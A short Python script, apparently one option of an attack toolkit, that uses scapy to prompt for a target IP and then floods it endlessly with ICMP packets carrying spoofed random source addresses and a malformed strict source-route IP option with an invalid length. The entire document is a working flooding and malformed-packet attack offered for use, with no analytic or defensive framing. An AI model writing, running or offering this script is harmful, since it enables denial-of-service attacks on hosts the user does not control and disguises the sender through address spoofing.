import scapy.all as scapy
import os


def Wrong_IP():

	clear = os.system('clear')
	print("**************************************")
	print("         Incorrect IP option")
	print("**************************************")

	print("Please input your target's IP")
	target = input("[Incorrect IP Option]#")
	num = 0
	try:
		while True:
			packet = scapy.IP(src=scapy.RandIP(),dst=target,options=[scapy.IPOption_SSRR(length=2),scapy.IPOption_EOL()])/scapy.ICMP()
			scapy.send(packet,verbose=False)
			num +=1
			print("Sent "+str(num)+" packets")
	except KeyboardInterrupt:
		print("quit!")
	
Wrong_IP()